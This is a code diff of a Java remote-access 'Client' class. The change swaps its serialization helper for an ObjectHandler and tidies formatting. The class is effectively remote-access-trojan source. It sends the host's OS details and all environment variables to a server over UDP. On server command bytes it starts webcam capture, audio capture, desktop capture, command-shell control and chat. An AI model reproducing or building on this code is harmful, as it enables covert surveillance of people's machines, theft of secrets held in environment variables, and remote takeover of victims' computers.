@@ -1,16 +1,17 @@
 package Client;
 
 import Client.Features.*;
+import Handler.ObjectHandler;
 import Handler.InfoHandler;
-import Handler.ObjectSerialization;
 import Tools.Network.NetworkInterface;
 
 import java.io.IOException;
-import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.SocketException;
 import java.time.LocalDateTime;
-import java.util.*;
+import java.util.Map;
+import java.util.Objects;
+import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -23,10 +24,11 @@ public class Client extends NetworkInterface {
 
     private static final ExecutorService threadListener = Executors.newSingleThreadScheduledExecutor();
 
-    private static final Random rand = new Random(LocalDateTime.now().getSecond());
-    private static final int id = rand.nextInt(1000000);
+    private final Random rand = new Random(LocalDateTime.now().getSecond());
+    private final int id = rand.nextInt(1000000);
 
     private final InfoHandler infoHandler;
+    private final ObjectHandler<ClientInfo<?>> objectHandler;
 
     private final CameraCapture cameraCapture = new CameraCapture(0);
     private final AudioCapture audioCapture = new AudioCapture();
@@ -38,15 +40,18 @@ public class Client extends NetworkInterface {
         super(PORT);
         socket = new DatagramSocket();
         infoHandler = new InfoHandler(socket);
+        objectHandler = new ObjectHandler<>();
         threadListener.execute(listener());
     }
 
     private Runnable listener() {
         return () -> {
             try {
-                packet = new DatagramPacket(new byte[]{CommandByte.START_BYTE, (byte) id}, 2);
+                String value = String.valueOf(id);
+                ClientInfo<String[]> info = () -> new String[]{String.valueOf(CommandByte.START_BYTE), value};
+                byte[] infoData = Objects.requireNonNull(objectHandler.writeObjects(info));
                 socket.connect(address, PORT);
-                infoHandler.send(new byte[]{CommandByte.START_BYTE, (byte) id }, 2);
+                infoHandler.send(infoData, infoData.length);
                 socket.disconnect();
                 byte[] dataReceived = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
                 if (dataReceived[0] == CommandByte.CONFIRMATION_BYTE) {
@@ -62,8 +67,7 @@ public class Client extends NetworkInterface {
     private Runnable infoListener() {
         return () -> {
             ClientInfo<String[]> osInfoClient = () -> new String[]
-                    {       String.valueOf(id),
-                            System.getProperty("os.name"),
+                    {       System.getProperty("os.name"),
                             System.getProperty("os.version"),
                             System.getProperty("os.vendor"),
                             System.getProperty("os.arch"),
@@ -71,8 +75,8 @@ public class Client extends NetworkInterface {
                     };
             ClientInfo<Map<String, String>> osInfoSystem = System::getenv;
 
-            byte[] objInfo = Objects.requireNonNull(ObjectSerialization.serialize(osInfoClient.get()));
-            byte[] objSystem = Objects.requireNonNull(ObjectSerialization.serialize(osInfoSystem.get()));
+            byte[] objInfo = Objects.requireNonNull(objectHandler.writeObjects(osInfoClient));
+            byte[] objSystem = Objects.requireNonNull(objectHandler.writeObjects(osInfoSystem));
 
             try {
                 socket.connect(address, PORT);
@@ -81,7 +85,7 @@ public class Client extends NetworkInterface {
                 infoHandler.send(objSystem, objSystem.length);
                 socket.disconnect();
 
-                if (infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort())[0] == CommandByte.INFO_ACHIEVED_BYTE){
+                if (infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort())[0] == CommandByte.INFO_ACHIEVED_BYTE) {
                     threadListener.execute(featureListener());
                 }
             } catch (IOException e) {
@@ -106,7 +110,9 @@ public class Client extends NetworkInterface {
                         case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
                         case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
                         case CommandByte.CHAT_BYTE -> chat.startFeature();
-                        case CommandByte.STOP_BYTE -> { break outer; }
+                        case CommandByte.STOP_BYTE -> {
+                            break outer;
+                        }
                     }
                 } catch (IOException e) {
                     e.printStackTrace();
